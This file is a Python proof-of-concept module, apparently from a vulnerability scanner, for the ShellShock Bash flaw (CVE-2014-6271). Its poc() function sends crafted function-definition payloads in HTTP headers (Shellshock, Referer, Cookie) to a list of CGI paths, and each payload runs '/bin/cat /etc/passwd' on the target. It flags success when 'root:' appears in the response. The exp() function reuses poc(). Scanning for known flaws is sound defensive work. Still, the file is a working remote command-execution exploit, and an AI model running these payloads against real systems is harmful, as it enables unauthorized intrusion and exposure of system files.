from wsgiref import headers
import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''ShellShock - Remote Code Execution''',
        "description": '''GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka ShellShock.''',
        "severity": "critical",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2014-6271", 
            "https://nvd.nist.gov/vuln/detail/CVE-2014-7169", 
            "http://www.kb.cert.org/vuls/id/252743", 
            "http://www.us-cert.gov/ncas/alerts/TA14-268A"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "9.8",
            "cve-id": "CVE-2014-6271",
            "cwe-id": "CWE-78"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2014", "rce", "shellshock"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        paths = [
            "/",
            "/cgi-bin/status",
            "/cgi-bin/stats",
            "/cgi-bin/test",
            "/cgi-bin/status/status.cgi",
            "/test.cgi",
            "/debug.cgi",
            "/cgi-bin/test-cgi"
        ]
        headers = {
            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
        }
        for path in paths:
            resp = requests.get(url+path, headers=headers, timeout=10, verify=False, allow_redirects=False)
            if resp.status_code == 200 and "root:" in resp.text:
                result["success"] = True
                result["info"] = info()
                result["payload"] = url+path

                return result

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url